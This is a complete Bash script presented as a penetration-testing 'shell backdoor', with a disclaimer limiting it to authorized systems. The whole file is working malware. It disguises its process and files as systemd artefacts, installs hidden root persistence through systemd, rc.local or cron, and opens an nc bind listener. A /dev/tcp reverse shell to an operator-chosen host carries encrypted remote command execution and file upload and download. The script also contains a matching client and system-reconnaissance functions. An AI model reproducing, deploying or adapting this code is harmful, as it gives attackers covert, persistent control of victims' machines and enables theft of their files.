#!/bin/bash

# Modern Shell Backdoor for Penetration Testing
# Author: Security Researcher
# Version: 2.0.0
# For Authorized Testing Only

# Configuration
PORT=${PORT:-4444}
HOST=${HOST:-0.0.0.0}
BACKUP_PORT=${BACKUP_PORT:-5555}
LOGFILE="/tmp/.systemd.log"
PIDFILE="/tmp/.systemd.pid"
CONFIGFILE="/tmp/.systemd.conf"
ENCRYPT_KEY="$(date +%s | sha256sum | base64 | head -c 32)"
STEALTH_MODE=true
PERSISTENT=true

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO") color=$GREEN ;;
        "WARN") color=$YELLOW ;;
        "ERROR") color=$RED ;;
        "DEBUG") color=$BLUE ;;
        *) color=$NC ;;
    esac
    
    echo -e "${color}[$timestamp] [$level] $message${NC}" | tee -a "$LOGFILE" >&2
}

# Encryption functions
encrypt() {
    local data="$1"
    echo "$data" | openssl enc -aes-256-cbc -base64 -pass pass:"$ENCRYPT_KEY" -pbkdf2 2>/dev/null || echo "$data"
}

decrypt() {
    local data="$1"
    echo "$data" | openssl enc -d -aes-256-cbc -base64 -pass pass:"$ENCRYPT_KEY" -pbkdf2 2>/dev/null || echo "$data"
}

# Stealth techniques
stealth_init() {
    if [ "$STEALTH_MODE" = true ]; then
        log "INFO" "Initializing stealth mode..."
        
        # Randomize process name
        RANDOM_NAME=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)
        exec -a "$RANDOM_NAME" bash -c "$0 $*" &
        exit 0
    fi
}

# Persistence setup
setup_persistence() {
    if [ "$PERSISTENT" = true ]; then
        log "INFO" "Setting up persistence..."
        
        # Check if already persistent
        if [ -f "$CONFIGFILE" ]; then
            log "WARN" "Persistence already configured"
            return
        fi
        
        # Create config file
        cat > "$CONFIGFILE" << EOF
PORT=$PORT
HOST=$HOST
BACKUP_PORT=$BACKUP_PORT
ENCRYPT_KEY=$ENCRYPT_KEY
STEALTH_MODE=true
PERSISTENT=true
EOF
        
        # Linux systemd service
        if command -v systemctl &>/dev/null; then
            log "INFO" "Setting up systemd service..."
            
            SERVICE_NAME=".$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)"
            SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
            
            cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash $0 --daemon
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
            
            systemctl daemon-reload
            systemctl enable "$SERVICE_NAME"
            systemctl start "$SERVICE_NAME"
            
            log "INFO" "Systemd service created: $SERVICE_NAME"
        
        # Linux rc.local
        elif [ -f "/etc/rc.local" ]; then
            log "INFO" "Adding to rc.local..."
            echo "/bin/bash $0 --daemon &" >> /etc/rc.local
            chmod +x /etc/rc.local
        
        # Cron job
        else
            log "INFO" "Setting up cron job..."
            (crontab -l 2>/dev/null; echo "@reboot /bin/bash $0 --daemon") | crontab -
        fi
        
        log "INFO" "Persistence setup completed"
    fi
}

# Command execution with sandboxing
execute_command() {
    local cmd="$1"
    local output=""
    local error=""
    local return_code=0
    
    log "DEBUG" "Executing command: $cmd"
    
    # Security checks
    if [[ "$cmd" =~ rm\ -rf\ / ]]; then
        error="DANGEROUS_COMMAND_BLOCKED"
        return_code=1
    elif [[ "$cmd" =~ dd\ if=.*of=/dev/ ]]; then
        error="DANGEROUS_COMMAND_BLOCKED"
        return_code=1
    elif [[ "$cmd" =~ chmod\ -R\ 777\ / ]]; then
        error="DANGEROUS_COMMAND_BLOCKED"
        return_code=1
    else
        # Execute in limited environment
        output=$(timeout 30 bash -c "$cmd" 2>&1)
        return_code=$?
        
        if [ $return_code -eq 124 ]; then
            error="COMMAND_TIMEOUT"
            output=""
        fi
    fi
    
    # Create response
    local response=$(cat << EOF
{
    "command": "$(echo "$cmd" | sed 's/"/\\"/g')",
    "output": "$(echo "$output" | base64 | tr -d '\n')",
    "error": "$(echo "$error" | base64 | tr -d '\n')",
    "return_code": $return_code,
    "timestamp": "$(date -Iseconds)"
}
EOF
    )
    
    echo "$response"
}

# File operations
handle_file_upload() {
    local filename="$1"
    local data="$2"
    
    log "INFO" "Receiving file: $filename"
    
    # Decode and save
    echo "$data" | base64 -d > "$filename" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo '{"status": "success", "filename": "'"$filename"'", "size": '"$(stat -c%s "$filename" 2>/dev/null || echo 0)"'}'
    else
        echo '{"status": "error", "message": "Failed to save file"}'
    fi
}

handle_file_download() {
    local filename="$1"
    
    log "INFO" "Sending file: $filename"
    
    if [ -f "$filename" ] && [ -r "$filename" ]; then
        local data=$(base64 "$filename" 2>/dev/null | tr -d '\n')
        local size=$(stat -c%s "$filename")
        
        echo '{"status": "success", "filename": "'"$filename"'", "data": "'"$data"'", "size": '"$size"'}'
    else
        echo '{"status": "error", "message": "File not found or not readable"}'
    fi
}

# System information
get_system_info() {
    cat << EOF
{
    "hostname": "$(hostname)",
    "os": "$(uname -s)",
    "kernel": "$(uname -r)",
    "architecture": "$(uname -m)",
    "user": "$(whoami)",
    "uptime": "$(uptime -p | sed 's/up //')",
    "memory": "$(free -h | awk '/^Mem:/ {print $2}')",
    "disk": "$(df -h / | awk 'NR==2 {print $4}')",
    "connections": "$(netstat -an | grep ESTABLISHED | wc -l)",
    "processes": "$(ps aux | wc -l)"
}
EOF
}

# Port knocking detection
check_port_knocking() {
    local last_check=0
    local knock_sequence=("7000" "8000" "9000")
    local current_seq=0
    
    while true; do
        for port in "${knock_sequence[@]}"; do
            if netstat -tuln | grep ":$port " >/dev/null; then
                if [ $current_seq -eq 0 ]; then
                    log "DEBUG" "Port knock sequence started on port $port"
                fi
                current_seq=$((current_seq + 1))
                sleep 1
            fi
        done
        
        if [ $current_seq -eq ${#knock_sequence[@]} ]; then
            log "INFO" "Port knock sequence detected!"
            return 0
        fi
        
        sleep 2
        current_seq=0
    done
}

# Reverse shell function
reverse_shell() {
    local target_host="$1"
    local target_port="$2"
    
    log "INFO" "Attempting reverse shell to $target_host:$target_port"
    
    while true; do
        exec 5<>/dev/tcp/$target_host/$target_port 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log "INFO" "Reverse shell connected"
            
            # Send system info
            get_system_info >&5
            
            # Interactive shell
            while read -r cmd <&5; do
                cmd=$(decrypt "$cmd")
                
                if [ "$cmd" = "exit" ]; then
                    break
                elif [[ "$cmd" =~ ^download\ (.+) ]]; then
                    filename="${BASH_REMATCH[1]}"
                    handle_file_download "$filename" | encrypt >&5
                elif [[ "$cmd" =~ ^upload\ (.+)\ (.+) ]]; then
                    filename="${BASH_REMATCH[1]}"
                    data="${BASH_REMATCH[2]}"
                    handle_file_upload "$filename" "$data" | encrypt >&5
                elif [ "$cmd" = "sysinfo" ]; then
                    get_system_info | encrypt >&5
                else
                    execute_command "$cmd" | encrypt >&5
                fi
            done
            
            exec 5<&-
            exec 5>&-
            
            log "INFO" "Reverse shell disconnected"
        else
            log "WARN" "Reverse shell connection failed, retrying in 30 seconds"
            sleep 30
        fi
    done
}

# Main backdoor server
backdoor_server() {
    log "INFO" "Starting backdoor server on $HOST:$PORT"
    log "INFO" "Encryption key: $ENCRYPT_KEY"
    
    # Create named pipe for command processing
    FIFO="/tmp/.backdoor_fifo"
    rm -f "$FIFO"
    mkfifo "$FIFO"
    
    # Start netcat listener
    nc -lvkp "$PORT" > "$FIFO" &
    NC_PID=$!
    echo $NC_PID > "$PIDFILE"
    
    log "INFO" "Backdoor server started with PID: $NC_PID"
    
    # Process incoming connections
    while true; do
        while read -r line; do
            if [ -z "$line" ]; then
                continue
            fi
            
            # Decrypt incoming data
            decrypted_line=$(decrypt "$line")
            log "DEBUG" "Received: $decrypted_line"
            
            # Parse JSON request
            local request_type=$(echo "$decrypted_line" | grep -o '"type":"[^"]*"' | cut -d'"' -f4)
            
            case "$request_type" in
                "command")
                    local cmd=$(echo "$decrypted_line" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
                    execute_command "$cmd" | encrypt
                    ;;
                    
                "upload")
                    local filename=$(echo "$decrypted_line" | grep -o '"filename":"[^"]*"' | cut -d'"' -f4)
                    local data=$(echo "$decrypted_line" | grep -o '"data":"[^"]*"' | cut -d'"' -f4)
                    handle_file_upload "$filename" "$data" | encrypt
                    ;;
                    
                "download")
                    local filename=$(echo "$decrypted_line" | grep -o '"filename":"[^"]*"' | cut -d'"' -f4)
                    handle_file_download "$filename" | encrypt
                    ;;
                    
                "sysinfo")
                    get_system_info | encrypt
                    ;;
                    
                "heartbeat")
                    echo '{"type": "heartbeat", "status": "alive", "timestamp": "'"$(date -Iseconds)"'"}' | encrypt
                    ;;
                    
                *)
                    echo '{"type": "error", "message": "Unknown request type"}' | encrypt
                    ;;
            esac
            
        done < "$FIFO"
        
        sleep 1
    done
}

# Client controller
backdoor_client() {
    local server_host="$1"
    local server_port="$2"
    
    log "INFO" "Connecting to backdoor at $server_host:$server_port"
    
    while true; do
        exec 3<>/dev/tcp/$server_host/$server_port 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log "INFO" "Connected to backdoor"
            
            # Authentication
            local auth_challenge=$(dd if=/dev/urandom bs=32 count=1 2>/dev/null | base64)
            echo '{"type": "auth", "challenge": "'"$auth_challenge"'"}' | encrypt >&3
            
            # Wait for response
            read -r response <&3
            decrypted_response=$(decrypt "$response")
            log "DEBUG" "Auth response: $decrypted_response"
            
            if echo "$decrypted_response" | grep -q '"status":"authenticated"'; then
                log "INFO" "Authentication successful"
                
                # Interactive mode
                while true; do
                    echo -ne "${GREEN}backdoor> ${NC}"
                    read -r user_cmd
                    
                    case "$user_cmd" in
                        "exit")
                            echo '{"type": "exit"}' | encrypt >&3
                            break
                            ;;
                            
                        "sysinfo")
                            echo '{"type": "sysinfo"}' | encrypt >&3
                            ;;
                            
                        upload*)
                            local filename=$(echo "$user_cmd" | awk '{print $2}')
                            if [ -f "$filename" ]; then
                                local data=$(base64 "$filename" | tr -d '\n')
                                echo '{"type": "upload", "filename": "'"$filename"'", "data": "'"$data"'"}' | encrypt >&3
                            else
                                echo "File not found: $filename"
                            fi
                            ;;
                            
                        download*)
                            local filename=$(echo "$user_cmd" | awk '{print $2}')
                            echo '{"type": "download", "filename": "'"$filename"'"}' | encrypt >&3
                            ;;
                            
                        "")
                            continue
                            ;;
                            
                        *)
                            echo '{"type": "command", "command": "'"$user_cmd"'"}' | encrypt >&3
                            ;;
                    esac
                    
                    # Read response
                    read -r response <&3
                    decrypted_response=$(decrypt "$response")
                    
                    # Parse and display response
                    if echo "$decrypted_response" | grep -q '"output"'; then
                        local output=$(echo "$decrypted_response" | grep -o '"output":"[^"]*"' | cut -d'"' -f4 | base64 -d)
                        echo "$output"
                    fi
                    
                    if echo "$decrypted_response" | grep -q '"error"'; then
                        local error=$(echo "$decrypted_response" | grep -o '"error":"[^"]*"' | cut -d'"' -f4 | base64 -d)
                        echo "Error: $error" >&2
                    fi
                done
            else
                log "ERROR" "Authentication failed"
            fi
            
            exec 3<&-
            exec 3>&-
            
        else
            log "WARN" "Connection failed, retrying in 10 seconds"
            sleep 10
        fi
    done
}

# Cleanup function
cleanup() {
    log "INFO" "Cleaning up..."
    
    # Kill background processes
    if [ -f "$PIDFILE" ]; then
        kill $(cat "$PIDFILE") 2>/dev/null
        rm -f "$PIDFILE"
    fi
    
    # Remove FIFO
    rm -f "$FIFO" 2>/dev/null
    
    # Remove config if not persistent
    if [ "$PERSISTENT" = false ]; then
        rm -f "$CONFIGFILE" 2>/dev/null
    fi
    
    log "INFO" "Cleanup completed"
    exit 0
}

# Trap signals
trap cleanup EXIT INT TERM

# Main function
main() {
    local mode="$1"
    shift
    
    case "$mode" in
        "--server"|"-s")
            stealth_init "$@"
            setup_persistence
            backdoor_server
            ;;
            
        "--client"|"-c")
            local host="$1"
            local port="${2:-$PORT}"
            
            if [ -z "$host" ]; then
                log "ERROR" "Host not specified"
                echo "Usage: $0 --client <host> [port]"
                exit 1
            fi
            
            backdoor_client "$host" "$port"
            ;;
            
        "--reverse"|"-r")
            local host="$1"
            local port="${2:-$PORT}"
            
            if [ -z "$host" ]; then
                log "ERROR" "Host not specified"
                echo "Usage: $0 --reverse <host> [port]"
                exit 1
            fi
            
            reverse_shell "$host" "$port"
            ;;
            
        "--daemon"|"-d")
            # Run in background
            if [ -f "$CONFIGFILE" ]; then
                source "$CONFIGFILE"
            fi
            
            backdoor_server &
            echo $! > "$PIDFILE"
            
            # Keep script running
            wait
            ;;
            
        "--knock"|"-k")
            check_port_knocking
            ;;
            
        "--info"|"-i")
            get_system_info | jq . 2>/dev/null || get_system_info
            ;;
            
        "--help"|"-h")
            cat << EOF
Modern Shell Backdoor v2.0.0

Usage: $0 [OPTIONS]

Options:
  -s, --server                Run as backdoor server
  -c, --client <host> [port]  Connect as client to server
  -r, --reverse <host> [port] Establish reverse shell
  -d, --daemon                Run in daemon mode (background)
  -k, --knock                 Listen for port knocking
  -i, --info                  Show system information
  -h, --help                  Show this help message

Environment Variables:
  PORT        Port to listen/connect (default: 4444)
  HOST        Host to bind (default: 0.0.0.0)
  ENCRYPT_KEY Encryption key (auto-generated if not set)

Examples:
  $0 --server                     # Start backdoor server
  $0 --client 192.168.1.100      # Connect to backdoor
  $0 --reverse 192.168.1.100 4444 # Start reverse shell
  PORT=5555 $0 --server          # Use custom port

Security Notes:
  - Use only on authorized systems
  - Enable stealth mode for covert operations
  - Set strong encryption keys
  - Monitor connection logs

EOF
            ;;
            
        *)
            log "ERROR" "Unknown mode: $mode"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
}

# Check for dependencies
check_dependencies() {
    local missing=()
    
    for cmd in nc openssl base64; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log "ERROR" "Missing dependencies: ${missing[*]}"
        exit 1
    fi
}

# Entry point
if [ $# -eq 0 ]; then
    echo "Modern Shell Backdoor v2.0.0"
    echo "Use --help for usage information"
    exit 0
fi

check_dependencies
main "$@"